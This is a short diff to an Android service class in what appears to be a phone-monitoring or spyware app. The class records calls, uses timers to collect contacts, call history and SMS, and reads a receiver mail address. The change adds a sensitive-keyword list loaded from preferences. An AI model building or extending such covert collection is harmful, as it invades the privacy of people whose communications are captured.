@@ -61,6 +61,8 @@ public class BootService extends Service
 	private static MediaRecorder recorder;
 	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDirStr();
 	
+	public static String[] sensitiveWordArray = null;
+	
 	static {
 		recorder = new MediaRecorder();
 	}
@@ -200,6 +202,9 @@ public class BootService extends Service
 		// Start timer to get contacts, phone call history and SMS
 		if (ConfigCtrl.isLegal(context)) 
 		{
+			// Get global varaibles
+			sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
+			
 			// ------------------------------------------------------------------			
 			// Start timers and listeners
 			String recvMail = GlobalPrefActivity.getReceiverMail(context);
